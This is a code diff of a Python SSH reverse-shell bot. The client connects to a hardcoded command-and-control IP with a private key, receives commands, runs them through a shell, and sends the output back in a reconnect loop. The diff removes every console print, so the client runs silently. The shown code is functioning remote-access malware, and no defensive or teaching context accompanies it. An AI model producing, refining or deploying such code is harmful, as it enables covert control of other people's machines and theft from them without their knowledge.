@@ -18,22 +18,18 @@ process = None
 def exit_gracefully():
     global ssh_client, ssh_session, process
     
-    print("\n\n[!] Exiting gracefully...")
 
     # Close SSH session and client if open
     if ssh_session and ssh_session.active:
         ssh_session.close()
-        print("[!] SSH session closed.")
     
     if ssh_client:
         ssh_client.close()
-        print("[!] SSH client disconnected.")
     
     # Terminate subprocess if it’s still running
     if process and process.poll() is None:
         process.terminate()
         process.wait()
-        print("[!] Subprocess terminated.")
 
     # Exit the program
     sys.exit(0)
@@ -49,7 +45,6 @@ signal.signal(signal.SIGINT, signal_handler)
 def exec_underlying_command(command):
     if isinstance(command, bytes):
         command = command.decode()
-    print(f"[*] Received command:\n\t'{command}'")
 
     process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     stdout, stderr = process.communicate()  # Get the output and errors if any
@@ -95,24 +90,19 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
 
     #while server_instructions != "kill":
     if ssh_session.active:
-        print("[!] Sending identity!")
         ssh_session.send(bot_user.encode())
 
-        print("[!] Listening for instructions ...")
         server_instructions = ssh_session.recv(1024).decode().strip()
         server_instructions = server_instructions.encode()
 
         if server_instructions:
-            print(f"[!] Received command: {server_instructions}")
 
             # Handle termination command
             if server_instructions == 'kill':
-                print("[!] Session terminated by the server!")
                 exit_gracefully()
 
 
             # Execute command on the channel and capture output
-            print("Trying to execute the command")
             try:
                 response = exec_underlying_command(server_instructions)
             except Exception as e:
@@ -120,7 +110,6 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
 
             ssh_session.send(response.encode())
 
-            print("[!] Response sent!")
 
             timeout_thread =  threading.Thread(target=max_timeout, args=())
             if timeout == True:
@@ -130,7 +119,6 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
 
                 response = f"Timeout while listening new instructions!"
                 ssh_session.send(response.encode())
-                print("[!] Response sent!")
 
                 # Make a recursive call
                 #try:
@@ -158,7 +146,6 @@ if __name__ == "__main__":
             ssh_rev_shell('34.204.78.186', 'ubuntu', './archenemy_rsa', user, 64000)
         except Exception as e:
             pass
-            #print(f"[!] Reconnection to C2 server failed!\n{e}\n")
 
         # How frequent request a command
         time.sleep(0.5)
